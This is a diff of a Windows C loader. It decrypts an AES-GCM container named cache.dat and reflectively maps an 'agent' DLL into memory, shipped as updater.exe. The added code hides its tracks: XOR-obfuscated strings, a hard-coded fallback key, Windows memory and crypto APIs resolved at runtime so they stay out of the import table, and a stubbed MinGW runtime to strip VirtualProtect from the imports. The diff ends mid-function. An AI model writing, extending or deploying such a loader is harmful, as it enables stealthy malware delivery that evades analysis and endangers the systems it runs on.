@@ -7,7 +7,7 @@
  * 文件作用：专门加载 DHPL1 direct_https 容器的 profile-only loader。
  *
  * 小白版流程：
- * 1. exe 读取 cache.dhpl；
+ * 1. exe 优先读取 cache.dat；如果没有，再回退读取 cache.dhpl；
  * 2. 用 AES-256-GCM 解密，得到 DHPL1 自定义容器；
  * 3. 容器里不是完整 PE 文件，而是已经离线拆好的 section/import/reloc/TLS 等最小信息；
  * 4. loader 按这些最小信息把 direct_https DLL 映射到内存；
@@ -21,41 +21,75 @@
 typedef DWORD (WINAPI *RunAgentDllFn)(void);
 typedef BOOL (WINAPI *DllMainFn)(HINSTANCE, DWORD, LPVOID);
 
-#ifndef PROFILE_ONLY_KEY
-#define PROFILE_ONLY_KEY "CHANGE_ME_MEMORY_LOADER_KEY"
-#endif
+#define PROFILE_ONLY_ASCII_XOR_KEY 0x5A
 
-#ifndef PROFILE_ONLY_KEY_ENV
-#define PROFILE_ONLY_KEY_ENV "DHPL_KEY"
-#endif
-
-#ifndef PROFILE_ONLY_KEY_FILE_ENV
-#define PROFILE_ONLY_KEY_FILE_ENV "DHPL_KEY_FILE"
+/*
+ * MinGW 的 crt2.o 会引用 _pei386_runtime_relocator()；
+ * 默认情况下这会把 libmingw32.a 里的 pseudo-reloc.o 一起拉进来，
+ * 于是额外带入：
+ *   - __imp_VirtualProtect / __imp_VirtualQuery
+ *   - "  VirtualProtect failed with code 0x%x" 之类的诊断字符串
+ *
+ * 当前 profile-only noenv single 默认路线不依赖 MinGW runtime pseudo-reloc：
+ * - 源码编译单元自身已经不再直接引用 VirtualAlloc / VirtualFree /
+ *   GetSystemInfo / RtlAddFunctionTable / VirtualProtect；
+ * - 运行时需要的 WinAPI 由 loader 自己用 LoadLibraryA/GetProcAddress 解析；
+ * - 实验验证过：用 no-op stub 覆盖 _pei386_runtime_relocator 后，功能链
+ *   （callback / hello / baseline / second-instance）仍完整通过。
+ *
+ * 因此仅在显式开启该宏时，用本地 stub 挡住 MinGW 的 pseudo-reloc.o。
+ * 这样可以把默认 dynmem 目标里的残留 VirtualProtect import 去掉。
+ */
+#if defined(PROFILE_ONLY_DISABLE_MINGW_RUNTIME_PSEUDO_RELOC)
+void _pei386_runtime_relocator(void)
+{
+}
 #endif
 
 #define DHPL_VERSION 1
 #define DHPL_ARCH_X64 0x8664
-#define DHPL_MAGIC0 'D'
-#define DHPL_MAGIC1 'H'
-#define DHPL_MAGIC2 'P'
-#define DHPL_MAGIC3 'L'
-#define DHPL_MAGIC4 '1'
+#define DHPL_MAGIC0 0x4c
+#define DHPL_MAGIC1 0x57
+#define DHPL_MAGIC2 0x39
+#define DHPL_MAGIC3 0x15
+#define DHPL_MAGIC4 0x4b
 
-#define DHPLE1_VERSION 1
 #define DHPLE2_VERSION 2
-#define DHPLE_ALG_AES256_GCM_SHA256_KEY 1
 #define DHPLE_ALG_AES256_GCM_PBKDF2_SHA256_KEY 2
 #define DHPLE_KDF_PBKDF2_HMAC_SHA256 1
-#define DHPLE_MAGIC0 'D'
-#define DHPLE_MAGIC1 'H'
-#define DHPLE_MAGIC2 'P'
-#define DHPLE_MAGIC3 'L'
-#define DHPLE_MAGIC4 'E'
-#define DHPLE_MAGIC5_V1 '1'
-#define DHPLE_MAGIC5_V2 '2'
+#define DHPLE_MAGIC0 0x48
+#define DHPLE_MAGIC1 0x5d
+#define DHPLE_MAGIC2 0x72
+#define DHPLE_MAGIC3 0x05
+#define DHPLE_MAGIC4 0x6a
+#define DHPLE_MAGIC5_V2 0x02
 
-static const unsigned char DHPLE_AAD_V1[] = "DHPL1-AES256-GCM-SHA256KEY-v1";
-static const unsigned char DHPLE_AAD_V2[] = "DHPL1-AES256-GCM-PBKDF2-SHA256-v2";
+/*
+ * release 版把几个最显眼的固定明文（默认 key、env 名、默认 payload 文件名）
+ * 先做一层轻量 XOR 存放，避免 strings 直接看到实验标签。
+ *
+ * 这不是加密，只是最小化“把协议信息/实验命名直接明文暴露在 loader 里”。
+ * 功能语义保持不变：无参双击仍然优先找 cache.dat，找不到再回退 cache.dhpl；
+ * 默认 key / env 名也仍与现有脚本兼容。
+ */
+static const unsigned char g_profile_only_key_enc[] = {
+    57, 46, 60, 119, 55, 63, 55, 53, 40, 35, 119, 54, 53, 59, 62,
+    63, 40, 119, 49, 63, 35, 119, 104, 106, 104, 108, 106, 108, 104, 110
+};
+#if !defined(PROFILE_ONLY_NO_ENV_KEY)
+static const unsigned char g_profile_only_key_env_enc[] = { 30, 18, 10, 22, 5, 17, 31, 3 };
+#endif
+#if defined(PROFILE_ONLY_DIAG) && !defined(PROFILE_ONLY_NO_LOG_ENV)
+static const unsigned char g_profile_only_log_env_enc[] = { 30, 18, 10, 22, 5, 22, 21, 27, 30, 31, 8, 5, 22, 21, 29 };
+#endif
+static const unsigned char g_profile_only_cache_dat_enc[] = { 57, 59, 57, 50, 63, 116, 62, 59, 46 };
+static const unsigned char g_profile_only_cache_dhpl_enc[] = { 57, 59, 57, 50, 63, 116, 62, 50, 42, 54 };
+
+static const unsigned char DHPLE_AAD_V2[] = {
+    0x79, 0x3b, 0x73, 0x0c, 0x26, 0x4c, 0x27, 0x10,
+    0x48, 0x73, 0x63, 0x6a, 0x0a, 0x33, 0x0e, 0x21,
+    0x06, 0x3c, 0x02, 0x53, 0x6d, 0x67, 0x16, 0x1a
+};
 
 #ifndef NT_SUCCESS
 #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
@@ -112,7 +146,381 @@ static void touch_release_markers(void)
 }
 #endif
 
+#if defined(PROFILE_ONLY_DIAG)
 static const char* g_log_path = NULL;
+#endif
+
+static void decode_ascii_xor(char* out, SIZE_T outSize, const unsigned char* enc, SIZE_T encLen)
+{
+    SIZE_T i;
+    if (!out || !enc || outSize < encLen + 1) return;
+    for (i = 0; i < encLen; i++) {
+        out[i] = (char)(enc[i] ^ PROFILE_ONLY_ASCII_XOR_KEY);
+    }
+    out[encLen] = 0;
+}
+
+static const char* get_default_key_fallback(void)
+{
+    static char buf[sizeof(g_profile_only_key_enc) + 1];
+    static int init = 0;
+    if (!init) {
+        decode_ascii_xor(buf, sizeof(buf), g_profile_only_key_enc, sizeof(g_profile_only_key_enc));
+        init = 1;
+    }
+    return buf;
+}
+
+#if !defined(PROFILE_ONLY_NO_ENV_KEY)
+static const char* get_key_env_name(void)
+{
+    static char buf[sizeof(g_profile_only_key_env_enc) + 1];
+    static int init = 0;
+    if (!init) {
+        decode_ascii_xor(buf, sizeof(buf), g_profile_only_key_env_enc, sizeof(g_profile_only_key_env_enc));
+        init = 1;
+    }
+    return buf;
+}
+#endif
+
+#if defined(PROFILE_ONLY_DIAG) && !defined(PROFILE_ONLY_NO_LOG_ENV)
+static const char* get_log_env_name(void)
+{
+    static char buf[sizeof(g_profile_only_log_env_enc) + 1];
+    static int init = 0;
+    if (!init) {
+        decode_ascii_xor(buf, sizeof(buf), g_profile_only_log_env_enc, sizeof(g_profile_only_log_env_enc));
+        init = 1;
+    }
+    return buf;
+}
+#endif
+
+static const char* get_default_cache_dat_name(void)
+{
+    static char buf[sizeof(g_profile_only_cache_dat_enc) + 1];
+    static int init = 0;
+    if (!init) {
+        decode_ascii_xor(buf, sizeof(buf), g_profile_only_cache_dat_enc, sizeof(g_profile_only_cache_dat_enc));
+        init = 1;
+    }
+    return buf;
+}
+
+static const char* get_default_cache_dhpl_name(void)
+{
+    static char buf[sizeof(g_profile_only_cache_dhpl_enc) + 1];
+    static int init = 0;
+    if (!init) {
+        decode_ascii_xor(buf, sizeof(buf), g_profile_only_cache_dhpl_enc, sizeof(g_profile_only_cache_dhpl_enc));
+        init = 1;
+    }
+    return buf;
+}
+
+#if defined(PROFILE_ONLY_DYNAMIC_BCRYPT)
+typedef NTSTATUS (WINAPI *BCryptOpenAlgorithmProviderFn)(
+    BCRYPT_ALG_HANDLE*,
+    LPCWSTR,
+    LPCWSTR,
+    ULONG);
+typedef NTSTATUS (WINAPI *BCryptCloseAlgorithmProviderFn)(
+    BCRYPT_ALG_HANDLE,
+    ULONG);
+typedef NTSTATUS (WINAPI *BCryptDeriveKeyPBKDF2Fn)(
+    BCRYPT_ALG_HANDLE,
+    PUCHAR,
+    ULONG,
+    PUCHAR,
+    ULONG,
+    ULONGLONG,
+    PUCHAR,
+    ULONG,
+    ULONG);
+typedef NTSTATUS (WINAPI *BCryptSetPropertyFn)(
+    BCRYPT_HANDLE,
+    LPCWSTR,
+    PUCHAR,
+    ULONG,
+    ULONG);
+typedef NTSTATUS (WINAPI *BCryptGetPropertyFn)(
+    BCRYPT_HANDLE,
+    LPCWSTR,
+    PUCHAR,
+    ULONG,
+    ULONG*,
+    ULONG);
+typedef NTSTATUS (WINAPI *BCryptGenerateSymmetricKeyFn)(
+    BCRYPT_ALG_HANDLE,
+    BCRYPT_KEY_HANDLE*,
+    PUCHAR,
+    ULONG,
+    PUCHAR,
+    ULONG,
+    ULONG);
+typedef NTSTATUS (WINAPI *BCryptDecryptFn)(
+    BCRYPT_KEY_HANDLE,
+    PUCHAR,
+    ULONG,
+    VOID*,
+    PUCHAR,
+    ULONG,
+    PUCHAR,
+    ULONG,
+    ULONG*,
+    ULONG);
+typedef NTSTATUS (WINAPI *BCryptDestroyKeyFn)(
+    BCRYPT_KEY_HANDLE);
+
+static const unsigned char g_bcrypt_module_enc[] = { 56, 57, 40, 35, 42, 46, 116, 62, 54, 54 };
+static const unsigned char g_bcrypt_open_alg_enc[] = {
+    24, 25, 40, 35, 42, 46, 21, 42, 63, 52, 27, 54, 61, 53, 40, 51, 46, 50, 55, 10, 40, 53, 44, 51, 62, 63, 40
+};
+static const unsigned char g_bcrypt_close_alg_enc[] = {
+    24, 25, 40, 35, 42, 46, 25, 54, 53, 41, 63, 27, 54, 61, 53, 40, 51, 46, 50, 55, 10, 40, 53, 44, 51, 62, 63, 40
+};
+static const unsigned char g_bcrypt_pbkdf2_enc[] = {
+    24, 25, 40, 35, 42, 46, 30, 63, 40, 51, 44, 63, 17, 63, 35, 10, 24, 17, 30, 28, 104
+};
+static const unsigned char g_bcrypt_set_property_enc[] = {
+    24, 25, 40, 35, 42, 46, 9, 63, 46, 10, 40, 53, 42, 63, 40, 46, 35
+};
+static const unsigned char g_bcrypt_get_property_enc[] = {
+    24, 25, 40, 35, 42, 46, 29, 63, 46, 10, 40, 53, 42, 63, 40, 46, 35
+};
+static const unsigned char g_bcrypt_generate_key_enc[] = {
+    24, 25, 40, 35, 42, 46, 29, 63, 52, 63, 40, 59, 46, 63, 9, 35, 55, 55, 63, 46, 40, 51, 57, 17, 63, 35
+};
+static const unsigned char g_bcrypt_decrypt_enc[] = {
+    24, 25, 40, 35, 42, 46, 30, 63, 57, 40, 35, 42, 46
+};
+static const unsigned char g_bcrypt_destroy_key_enc[] = {
+    24, 25, 40, 35, 42, 46, 30, 63, 41, 46, 40, 53, 35, 17, 63, 35
+};
+
+static BCryptOpenAlgorithmProviderFn g_pBCryptOpenAlgorithmProvider = NULL;
+static BCryptCloseAlgorithmProviderFn g_pBCryptCloseAlgorithmProvider = NULL;
+static BCryptDeriveKeyPBKDF2Fn g_pBCryptDeriveKeyPBKDF2 = NULL;
+static BCryptSetPropertyFn g_pBCryptSetProperty = NULL;
+static BCryptGetPropertyFn g_pBCryptGetProperty = NULL;
+static BCryptGenerateSymmetricKeyFn g_pBCryptGenerateSymmetricKey = NULL;
+static BCryptDecryptFn g_pBCryptDecrypt = NULL;
+static BCryptDestroyKeyFn g_pBCryptDestroyKey = NULL;
+static int g_dynamic_bcrypt_ready = 0;
+
+static int resolve_dynamic_bcrypt(void)
+{
+    char moduleName[sizeof(g_bcrypt_module_enc) + 1];
+    char openAlgName[sizeof(g_bcrypt_open_alg_enc) + 1];
+    char closeAlgName[sizeof(g_bcrypt_close_alg_enc) + 1];
+    char pbkdf2Name[sizeof(g_bcrypt_pbkdf2_enc) + 1];
+    char setPropertyName[sizeof(g_bcrypt_set_property_enc) + 1];
+    char getPropertyName[sizeof(g_bcrypt_get_property_enc) + 1];
+    char generateKeyName[sizeof(g_bcrypt_generate_key_enc) + 1];
+    char decryptName[sizeof(g_bcrypt_decrypt_enc) + 1];
+    char destroyKeyName[sizeof(g_bcrypt_destroy_key_enc) + 1];
+    HMODULE mod;
+
+    if (g_dynamic_bcrypt_ready > 0) return 1;
+    if (g_dynamic_bcrypt_ready < 0) return 0;
+
+    decode_ascii_xor(moduleName, sizeof(moduleName), g_bcrypt_module_enc, sizeof(g_bcrypt_module_enc));
+    decode_ascii_xor(openAlgName, sizeof(openAlgName), g_bcrypt_open_alg_enc, sizeof(g_bcrypt_open_alg_enc));
+    decode_ascii_xor(closeAlgName, sizeof(closeAlgName), g_bcrypt_close_alg_enc, sizeof(g_bcrypt_close_alg_enc));
+    decode_ascii_xor(pbkdf2Name, sizeof(pbkdf2Name), g_bcrypt_pbkdf2_enc, sizeof(g_bcrypt_pbkdf2_enc));
+    decode_ascii_xor(setPropertyName, sizeof(setPropertyName), g_bcrypt_set_property_enc, sizeof(g_bcrypt_set_property_enc));
+    decode_ascii_xor(getPropertyName, sizeof(getPropertyName), g_bcrypt_get_property_enc, sizeof(g_bcrypt_get_property_enc));
+    decode_ascii_xor(generateKeyName, sizeof(generateKeyName), g_bcrypt_generate_key_enc, sizeof(g_bcrypt_generate_key_enc));
+    decode_ascii_xor(decryptName, sizeof(decryptName), g_bcrypt_decrypt_enc, sizeof(g_bcrypt_decrypt_enc));
+    decode_ascii_xor(destroyKeyName, sizeof(destroyKeyName), g_bcrypt_destroy_key_enc, sizeof(g_bcrypt_destroy_key_enc));
+
+    mod = LoadLibraryA(moduleName);
+    if (!mod) goto fail;
+
+    g_pBCryptOpenAlgorithmProvider = (BCryptOpenAlgorithmProviderFn)(void*)GetProcAddress(mod, openAlgName);
+    g_pBCryptCloseAlgorithmProvider = (BCryptCloseAlgorithmProviderFn)(void*)GetProcAddress(mod, closeAlgName);
+    g_pBCryptDeriveKeyPBKDF2 = (BCryptDeriveKeyPBKDF2Fn)(void*)GetProcAddress(mod, pbkdf2Name);
+    g_pBCryptSetProperty = (BCryptSetPropertyFn)(void*)GetProcAddress(mod, setPropertyName);
+    g_pBCryptGetProperty = (BCryptGetPropertyFn)(void*)GetProcAddress(mod, getPropertyName);
+    g_pBCryptGenerateSymmetricKey = (BCryptGenerateSymmetricKeyFn)(void*)GetProcAddress(mod, generateKeyName);
+    g_pBCryptDecrypt = (BCryptDecryptFn)(void*)GetProcAddress(mod, decryptName);
+    g_pBCryptDestroyKey = (BCryptDestroyKeyFn)(void*)GetProcAddress(mod, destroyKeyName);
+
+    if (!g_pBCryptOpenAlgorithmProvider ||
+        !g_pBCryptCloseAlgorithmProvider ||
+        !g_pBCryptDeriveKeyPBKDF2 ||
+        !g_pBCryptSetProperty ||
+        !g_pBCryptGetProperty ||
+        !g_pBCryptGenerateSymmetricKey ||
+        !g_pBCryptDecrypt ||
+        !g_pBCryptDestroyKey) {
+        goto fail;
+    }
+
+    g_dynamic_bcrypt_ready = 1;
+    return 1;
+
+fail:
+    g_pBCryptOpenAlgorithmProvider = NULL;
+    g_pBCryptCloseAlgorithmProvider = NULL;
+    g_pBCryptDeriveKeyPBKDF2 = NULL;
+    g_pBCryptSetProperty = NULL;
+    g_pBCryptGetProperty = NULL;
+    g_pBCryptGenerateSymmetricKey = NULL;
+    g_pBCryptDecrypt = NULL;
+    g_pBCryptDestroyKey = NULL;
+    g_dynamic_bcrypt_ready = -1;
+    return 0;
+}
+#endif
+
+#if defined(PROFILE_ONLY_DYNAMIC_MEM_API)
+typedef LPVOID (WINAPI *VirtualAllocFn)(
+    LPVOID,
+    SIZE_T,
+    DWORD,
+    DWORD);
+typedef BOOL (WINAPI *VirtualFreeFn)(
+    LPVOID,
+    SIZE_T,
+    DWORD);
+typedef BOOL (WINAPI *VirtualProtectFn)(
+    LPVOID,
+    SIZE_T,
+    DWORD,
+    PDWORD);
+typedef VOID (WINAPI *GetSystemInfoFn)(
+    LPSYSTEM_INFO);
+typedef BOOLEAN (WINAPI *RtlAddFunctionTableFn)(
+    PRUNTIME_FUNCTION,
+    DWORD,
+    DWORD64);
+
+static const unsigned char g_kernel32_module_enc[] = { 49, 63, 40, 52, 63, 54, 105, 104, 116, 62, 54, 54 };
+static const unsigned char g_virtual_alloc_enc[] = { 12, 51, 40, 46, 47, 59, 54, 27, 54, 54, 53, 57 };
+static const unsigned char g_virtual_free_enc[] = { 12, 51, 40, 46, 47, 59, 54, 28, 40, 63, 63 };
+static const unsigned char g_virtual_protect_enc[] = { 12, 51, 40, 46, 47, 59, 54, 10, 40, 53, 46, 63, 57, 46 };
+static const unsigned char g_get_system_info_enc[] = { 29, 63, 46, 9, 35, 41, 46, 63, 55, 19, 52, 60, 53 };
+static const unsigned char g_rtl_add_function_table_enc[] = { 8, 46, 54, 27, 62, 62, 28, 47, 52, 57, 46, 51, 53, 52, 14, 59, 56, 54, 63 };
+
+static VirtualAllocFn g_pVirtualAlloc = NULL;
+static VirtualFreeFn g_pVirtualFree = NULL;
+static VirtualProtectFn g_pVirtualProtect = NULL;
+static GetSystemInfoFn g_pGetSystemInfo = NULL;
+static RtlAddFunctionTableFn g_pRtlAddFunctionTable = NULL;
+static int g_dynamic_mem_ready = 0;
+
+static int resolve_dynamic_mem_api(void)
+{
+    char moduleName[sizeof(g_kernel32_module_enc) + 1];
+    char virtualAllocName[sizeof(g_virtual_alloc_enc) + 1];
+    char virtualFreeName[sizeof(g_virtual_free_enc) + 1];
+    char virtualProtectName[sizeof(g_virtual_protect_enc) + 1];
+    char getSystemInfoName[sizeof(g_get_system_info_enc) + 1];
+    char rtlAddFunctionTableName[sizeof(g_rtl_add_function_table_enc) + 1];
+    HMODULE mod;
+
+    if (g_dynamic_mem_ready > 0) return 1;
+    if (g_dynamic_mem_ready < 0) return 0;
+
+    decode_ascii_xor(moduleName, sizeof(moduleName), g_kernel32_module_enc, sizeof(g_kernel32_module_enc));
+    decode_ascii_xor(virtualAllocName, sizeof(virtualAllocName), g_virtual_alloc_enc, sizeof(g_virtual_alloc_enc));
+    decode_ascii_xor(virtualFreeName, sizeof(virtualFreeName), g_virtual_free_enc, sizeof(g_virtual_free_enc));
+    decode_ascii_xor(virtualProtectName, sizeof(virtualProtectName), g_virtual_protect_enc, sizeof(g_virtual_protect_enc));
+    decode_ascii_xor(getSystemInfoName, sizeof(getSystemInfoName), g_get_system_info_enc, sizeof(g_get_system_info_enc));
+    decode_ascii_xor(rtlAddFunctionTableName, sizeof(rtlAddFunctionTableName), g_rtl_add_function_table_enc, sizeof(g_rtl_add_function_table_enc));
+
+    mod = LoadLibraryA(moduleName);
+    if (!mod) goto fail;
+
+    g_pVirtualAlloc = (VirtualAllocFn)(void*)GetProcAddress(mod, virtualAllocName);
+    g_pVirtualFree = (VirtualFreeFn)(void*)GetProcAddress(mod, virtualFreeName);
+    g_pVirtualProtect = (VirtualProtectFn)(void*)GetProcAddress(mod, virtualProtectName);
+    g_pGetSystemInfo = (GetSystemInfoFn)(void*)GetProcAddress(mod, getSystemInfoName);
+    g_pRtlAddFunctionTable = (RtlAddFunctionTableFn)(void*)GetProcAddress(mod, rtlAddFunctionTableName);
+
+    if (!g_pVirtualAlloc ||
+        !g_pVirtualFree ||
+        !g_pVirtualProtect ||
+        !g_pGetSystemInfo ||
+        !g_pRtlAddFunctionTable) {
+        goto fail;
+    }
+
+    g_dynamic_mem_ready = 1;
+    return 1;
+
+fail:
+    g_pVirtualAlloc = NULL;
+    g_pVirtualFree = NULL;
+    g_pVirtualProtect = NULL;
+    g_pGetSystemInfo = NULL;
+    g_pRtlAddFunctionTable = NULL;
+    g_dynamic_mem_ready = -1;
+    return 0;
+}
+
+static LPVOID dhpl_virtual_alloc(LPVOID address, SIZE_T size, DWORD allocType, DWORD protect)
+{
+    if (!resolve_dynamic_mem_api()) return NULL;
+    return g_pVirtualAlloc(address, size, allocType, protect);
+}
+
+static BOOL dhpl_virtual_free(LPVOID address, SIZE_T size, DWORD freeType)
+{
+    if (!resolve_dynamic_mem_api()) return FALSE;
+    return g_pVirtualFree(address, size, freeType);
+}
+
+static BOOL dhpl_virtual_protect(LPVOID address, SIZE_T size, DWORD newProtect, PDWORD oldProtect)
+{
+    if (!resolve_dynamic_mem_api()) return FALSE;
+    return g_pVirtualProtect(address, size, newProtect, oldProtect);
+}
+
+static DWORD dhpl_get_page_size(void)
+{
+    SYSTEM_INFO si;
+    if (!resolve_dynamic_mem_api()) return 0x1000;
+    SecureZeroMemory(&si, sizeof(si));
+    g_pGetSystemInfo(&si);
+    return si.dwPageSize ? si.dwPageSize : 0x1000;
+}
+
+static int dhpl_add_function_table(PRUNTIME_FUNCTION table, DWORD count, DWORD64 imageBase)
+{
+    if (!resolve_dynamic_mem_api()) return 0;
+    return g_pRtlAddFunctionTable(table, count, imageBase) ? 1 : 0;
+}
+#else
+static LPVOID dhpl_virtual_alloc(LPVOID address, SIZE_T size, DWORD allocType, DWORD protect)
+{
+    return VirtualAlloc(address, size, allocType, protect);
+}
+
+static BOOL dhpl_virtual_free(LPVOID address, SIZE_T size, DWORD freeType)
+{
+    return VirtualFree(address, size, freeType);
+}
+
+static BOOL dhpl_virtual_protect(LPVOID address, SIZE_T size, DWORD newProtect, PDWORD oldProtect)
+{
+    return VirtualProtect(address, size, newProtect, oldProtect);
+}
+
+static DWORD dhpl_get_page_size(void)
+{
+    SYSTEM_INFO si;
+    GetSystemInfo(&si);
+    return si.dwPageSize ? si.dwPageSize : 0x1000;
+}
+
+static int dhpl_add_function_table(PRUNTIME_FUNCTION table, DWORD count, DWORD64 imageBase)
+{
+    return RtlAddFunctionTable(table, count, imageBase) ? 1 : 0;
+}
+#endif
 
 #pragma pack(push, 1)
 typedef struct DHPL_HEADER {
@@ -158,16 +566,6 @@ typedef struct DHPL_IMPORT_FIXED {
     WORD module_len;
     WORD name_len;
 } DHPL_IMPORT_FIXED;
-
-typedef struct DHPLE1_HEADER {
-    char magic[8];
-    DWORD version;
-    DWORD algorithm;
-    DWORD nonce_len;
-    DWORD tag_len;
-    DWORD plain_size;
-    DWORD cipher_size;
-} DHPLE1_HEADER;
 
 typedef struct DHPLE2_HEADER {
     char magic[8];
@@ -261,6 +659,31 @@ static int rva_range_ok(DWORD rva, DWORD size, DWORD image_size)
     return rva <= image_size && size <= image_size - rva;
 }
 
+static int file_exists_nondir(const char* path)
+{
+    DWORD attrs;
+    if (!path || !path[0]) return 0;
+    attrs = GetFileAttributesA(path);
+    if (attrs == INVALID_FILE_ATTRIBUTES) return 0;
+    return (attrs & FILE_ATTRIBUTE_DIRECTORY) == 0;
+}
+
+static const char* resolve_default_container_path(void)
+{
+    const char* cacheDat = get_default_cache_dat_name();
+    const char* cacheDhpl = get_default_cache_dhpl_name();
+    /*
+     * 从“两文件目录可双击”的角度，新的默认优先级是：
+     * 1. cache.dat  —— 当前 Windows staging 统一发布名；
+     * 2. cache.dhpl —— 兼容旧目录/旧手工投放方式。
+     *
+     * 这样既不破坏老目录，也让只有 updater.exe + cache.dat 的目录可以直接双击。
+     */
+    if (file_exists_nondir(cacheDat)) return cacheDat;
+    if (file_exists_nondir(cacheDhpl)) return cacheDhpl;
+    return cacheDat;
+}
+
 static int read_file_winapi(const char* path, unsigned char** outBuf, DWORD* outSize)
 {
     HANDLE h;
@@ -299,198 +722,141 @@ static int read_file_winapi(const char* path, unsigned char** outBuf, DWORD* out
     return 0;
 }
 
-static int str_eq(const char* a, const char* b)
+static const char* resolve_key_source(const char* keyArg)
 {
-    if (!a || !b) return 0;
-    while (*a && *b) {
-        if (*a != *b) return 0;
-        a++;
-        b++;
+#if defined(PROFILE_ONLY_NO_ENV_KEY)
+    /*
+     * production/noenv 变体只保留：
+     * 1. argv[2] literal key，方便实验时临时覆盖；
+     * 2. embedded fallback key，保证 updater.exe + cache.dat 无参双击路径。
+     *
+     * 这样 release_noenv 的 IAT/strings 不再携带 getenv / DHPL_KEY 语义。
+     */
+    if (keyArg && keyArg[0]) {
+        return keyArg;
     }
-    return *a == 0 && *b == 0;
-}
-
-static int str_starts_with(const char* s, const char* prefix)
-{
-    if (!s || !prefix) return 0;
-    while (*prefix) {
-        if (*s != *prefix) return 0;
-        s++;
-        prefix++;
-    }
-    return 1;
-}
-
-static void trim_ascii_key(char* s)
-{
-    char* end;
-    char* start;
-    SIZE_T len;
-    if (!s) return;
-    start = s;
-    while (*start == ' ' || *start == '\t' || *start == '\r' || *start == '\n') {
-        start++;
-    }
-    if (start != s) {
-        memmove(s, start, strlen(start) + 1);
-    }
-    len = strlen(s);
-    if (!len) return;
-    end = s + len - 1;
-    while (end >= s && (*end == ' ' || *end == '\t' || *end == '\r' || *end == '\n')) {
-        *end = 0;
-        if (end == s) break;
-        end--;
-    }
-}
-
-static char* read_key_file_alloc(const char* path)
-{
-    unsigned char* raw = NULL;
-    DWORD rawSize = 0;
-    char* text = NULL;
-    DWORD rc;
-
-    if (!path || !path[0]) return NULL;
-    rc = (DWORD)read_file_winapi(path, &raw, &rawSize);
-    if (rc != 0 || !raw || rawSize == 0 || rawSize > 4096) {
-        if (raw) heap_secure_free(raw, rawSize);
-        return NULL;
-    }
-    text = (char*)heap_alloc((SIZE_T)rawSize + 1);
-    if (!text) {
-        heap_secure_free(raw, rawSize);
-        return NULL;
-    }
-    memcpy(text, raw, rawSize);
-    text[rawSize] = 0;
-    heap_secure_free(raw, rawSize);
-    trim_ascii_key(text);
-    if (!text[0]) {
-        heap_secure_free((unsigned char*)text, rawSize + 1);
-        return NULL;
-    }
-    return text;
-}
-
-static const char* resolve_key_source(const char* keyArg, char** ownedKey)
-{
+    return get_default_key_fallback();
+#else
     const char* value = NULL;
-    const char* name = NULL;
-    const char* path = NULL;
-
-    if (ownedKey) *ownedKey = NULL;
+    const char* defaultKeyEnv = get_key_env_name();
 
     /*
      * key 来源优先级：
-     * 1. argv[2] 明确指定：
-     *    - 普通字符串：直接当 passphrase；
-     *    - env 或 env:NAME：从环境变量读取；
-     *    - file 或 file:PATH：从本地文本文件读取；
-     * 2. 如果 argv[2] 没传，先尝试 DHPL_KEY；
-     * 3. 再尝试 DHPL_KEY_FILE；
-     * 4. 最后回退到编译期 PROFILE_ONLY_KEY，保证旧测试脚本不被破坏。
+     * 1. argv[2]：直接当 passphrase literal；
+     * 2. 如果 argv[2] 没传，尝试默认环境变量；
+     * 3. 最后回退到内置 fallback key，保证同目录无参双击路径不被破坏。
+     *
+     * 说明：
+     * - loader 本体不再解析 `env:` / `file:` 这类启动协议；
+     * - 如果上层希望用环境变量、key 文件、DPAPI blob 等方式隐藏明文，
+     *   应由外层启动器先准备好运行环境，再让 loader 只看到最终 key。
      */
     if (keyArg && keyArg[0]) {
-        if (str_eq(keyArg, "env") || str_eq(keyArg, "env:") || str_eq(keyArg, "-")) {
-            value = getenv(PROFILE_ONLY_KEY_ENV);
-            return (value && value[0]) ? value : NULL;
-        }
-        if (str_starts_with(keyArg, "env:")) {
-            name = keyArg + 4;
-            value = getenv((name && name[0]) ? name : PROFILE_ONLY_KEY_ENV);
-            return (value && value[0]) ? value : NULL;
-        }
-        if (str_eq(keyArg, "file") || str_eq(keyArg, "file:")) {
-            path = getenv(PROFILE_ONLY_KEY_FILE_ENV);
-            if (!path || !path[0] || !ownedKey) return NULL;
-            *ownedKey = read_key_file_alloc(path);
-            return *ownedKey;
-        }
-        if (str_starts_with(keyArg, "file:")) {
-            path = keyArg + 5;
-            if (!path || !path[0] || !ownedKey) return NULL;
-            *ownedKey = read_key_file_alloc(path);
-            return *ownedKey;
-        }
         return keyArg;
     }
 
-    value = getenv(PROFILE_ONLY_KEY_ENV);
+    value = getenv(defaultKeyEnv);
     if (value && value[0]) return value;
 
-    path = getenv(PROFILE_ONLY_KEY_FILE_ENV);
-    if (path && path[0] && ownedKey) {
-        *ownedKey = read_key_file_alloc(path);
-        if (*ownedKey) return *ownedKey;
+    return get_default_key_fallback();
+#endif
+}
+
+#if defined(PROFILE_ONLY_SINGLE_INSTANCE)
+static DWORD fnv1a_path_ci(const char* s)
+{
+    DWORD h = 2166136261u;
+    while (s && *s) {
+        unsigned char c = (unsigned char)*s++;
+        if (c >= 'A' && c <= 'Z') c = (unsigned char)(c + ('a' - 'A'));
+        if (c == '/') c = '\\';
+        h ^= (DWORD)c;
+        h *= 16777619u;
     }
-
-    return PROFILE_ONLY_KEY;
+    return h;
 }
 
-static int dhple_magic_common_ok(const char magic[8], char versionChar)
+static void hex32_lower(char out[9], DWORD v)
 {
-    return magic &&
-        magic[0] == DHPLE_MAGIC0 &&
-        magic[1] == DHPLE_MAGIC1 &&
-        magic[2] == DHPLE_MAGIC2 &&
-        magic[3] == DHPLE_MAGIC3 &&
-        magic[4] == DHPLE_MAGIC4 &&
-        magic[5] == versionChar &&
-        magic[6] == 0 &&
-        magic[7] == 0;
+    static const char hx[] = "0123456789abcdef";
+    int i;
+    for (i = 0; i < 8; i++) {
+        out[i] = hx[(v >> (28 - i * 4)) & 0xf];
+    }
+    out[8] = 0;
 }
 
-static int dhple1_magic_ok(const DHPLE1_HEADER* h)
+static int acquire_single_instance(void)
 {
-    return h && dhple_magic_common_ok(h->magic, DHPLE_MAGIC5_V1);
+    char modulePath[1024];
+    char mutexName[64];
+    char hex[9];
+    DWORD n;
+    DWORD h;
+    int i;
+    HANDLE m;
+
+    n = GetModuleFileNameA(NULL, modulePath, (DWORD)sizeof(modulePath));
+    if (!n || n >= (DWORD)sizeof(modulePath)) {
+        return 1;
+    }
+    modulePath[n] = 0;
+    for (i = (int)n - 1; i >= 0; i--) {
+        if (modulePath[i] == '\\' || modulePath[i] == '/') {
+            modulePath[i] = 0;
+            break;
+        }
+    }
